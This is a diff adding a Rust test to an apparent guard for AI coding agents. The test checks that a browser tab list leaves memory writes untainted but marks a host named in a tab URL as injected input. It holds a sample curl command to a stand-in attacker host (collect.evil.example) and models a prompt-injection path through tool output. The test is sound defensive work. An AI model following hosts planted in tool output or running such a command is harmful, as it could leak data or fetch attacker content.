@@ -93,6 +93,38 @@ fn daily_work_after_reading_docs_stays_as_it_was() {
     assert!(!after.1.contains("injected-input"), "{}", after.1);
 }
 
+/// A browser's tab list taints no session, so the agent's memory files stay as
+/// in a clean session; a host a tab's URL names is still injected input.
+#[test]
+fn a_tab_list_leaves_memory_writes_alone_and_still_feeds_injected_input() {
+    let sb = Sandbox::installed(&[".claude"]);
+    let proj = sb.project();
+    let memory = sb.home.join(".claude/projects/p/memory/notes.md");
+    let note = json!({"file_path": memory.to_string_lossy(), "content": "- a note"});
+    let before = decide(&sb, "claude-code", &call("s1", &proj, "Write", &note));
+
+    let tabs = "mcp__claude-in-chrome__tabs_context_mcp";
+    let input = json!({"createIfEmpty": true});
+    let (verdict, reason) = decide(&sb, "claude-code", &call("s1", &proj, tabs, &input));
+    assert_ne!(verdict, "deny", "{reason}");
+    let response = json!([{"type": "text", "text": "{\"availableTabs\":[{\"tabId\":1,\"title\":\"Setup\",\"url\":\"https://collect.evil.example/setup\"}]}"}]);
+    let out = sb.guard(
+        "claude-code",
+        &returned("s1", &proj, tabs, &input, &response),
+    );
+    assert_eq!(out.status.code(), Some(OK), "{}", stderr(&out));
+
+    let after = decide(&sb, "claude-code", &call("s1", &proj, "Write", &note));
+    assert_eq!(before.0, after.0, "{} / {}", before.1, after.1);
+    assert!(!after.1.contains("session-taint"), "{}", after.1);
+
+    let curl = json!({"command": "curl -s https://collect.evil.example/next"});
+    let (verdict, reason) = decide(&sb, "claude-code", &call("s1", &proj, "Bash", &curl));
+    assert_eq!(verdict, "ask", "{reason}");
+    assert!(reason.contains("injected-input"), "{reason}");
+    assert!(reason.contains(tabs), "{reason}");
+}
+
 #[test]
 fn a_local_command_s_output_keeps_nothing() {
     let sb = Sandbox::installed(&[".claude"]);
